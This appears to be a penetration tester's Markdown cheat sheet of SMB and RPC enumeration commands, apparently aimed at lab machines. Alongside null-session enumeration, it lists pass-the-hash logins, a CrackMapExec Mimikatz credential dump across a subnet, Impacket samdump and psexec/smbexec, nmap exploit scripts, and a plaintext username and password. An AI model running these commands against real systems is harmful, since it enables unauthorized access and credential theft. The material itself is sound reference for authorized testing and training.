
# RPCClient
- Blank Auth: `rpcclient 10.10.10.192`
- Null User: `rpcclient 10.10.10.192 -U ''`

## Helpful commands
Requires null/successful authentication:
- `srvinfo` - server query info
- `enumdomusers` - domain users
- `getdompwinfo` - domain password info
- Can also be run from command line: `rpcclient -U "" -N 172.21.0.0 enumdomusers`

# SMBClient
- Null User (if prompted for password,hit enter for blank pw): 
    - `smbclient -L 10.10.10.192`
    - `smbclient -L 10.10.10.192 -U ''`
- If successful authentication, and can identify drive(s) to connect to:
    - `smbclient //10.10.10.192/profiles$`
    - `smbclient \\\\<IP>\\<Share> -N`


# CrackMapExec
- Blank Auth: 
    - `cme smb 10.10.10.192 --shares`
    - `cme smb 10.10.10.192 --shares -u ''`
    - `cme smb 10.10.10.192 --shares -u '' -p ''`
- Auth With Bogus User: `cme smb 10.10.10.192 --shares -u 'Zentest'`
- Auth with Bogus User Null Password: `cme smb 10.10.10.192 --shares -u 'Zentest' -p ''`
- list files and saves them locally: `crackmapexec smb IP -u '' -p '' -M spider_plus`
- List users: `crackmapexec smb IP -u '' -p '' --users`
- Password Policy: `crackmapexec smb IP -u '' -p '' --pass-pol`
- List Shares: `crackmapexec smb -L`
- Pass the Hash: `crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth`
- Local Admin Auth w/ PTH: `crackmapexec 172.21.0.0 -u Administrator -H [hash] --share`
- Mimikatz results (requires local admin): `crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz`

# Mount
Mount drive if user comes back with lots of data
- `sudo mount -t cifs //10.10.10.192/profiles$ '/mnt/'`


# Enum4linux(-ng):
Do you have credentials?
- `enum4linux -av -u username -p password 10.1.1.24`
- `Enum4linux -av 172.21.0.0`
- `enum4linux-ng -A 10.2.2.23 -u james -p FmyN3rZ37LNss2X`

# SMBmap
Do you have credenntials?
- `smbmap -H 172.21.0.0 -d [domain] -u [user] -p [password]`
- Null Authentication: `smbmap -H 172.21.0.0 -d [domain] -u "" -p ""`

# RDESKTOP!
- `rdesktop -g70% IP_Addr -u user1 -p pass1 -r disk:share=/root/tmp`

# Impacket
Do you have credentials?
- `/usr/share/doc/python3-impacket/examples/smbclient.py username@172.21.0.0`
- Impacket tools for access - i.e. psexec, smbexec
- `smbexec.py SHARE_NAME /location/to/share`
Impacket samdump
- `samdump.py SMB 172.21.0.0`

# Nmap
- `nmap --script smb-* -p 139,445, 172.21.0.0`
- `nmap --script smb-enum-* -p 139,445, 172.21.0.0`
- Same as above, just way more verbose: `nmap -Pn -n -p 139,445 --script=smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-protocols.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse,smb-webexec-exploit.nse <IP>`
- SMB v2 Info Collection: `nmap -p 139,445 --script=smb2-capabilities.nse,smb2-security-mode.nse,smb2-time.nse,smb2-vuln-uptime.nse <IP>`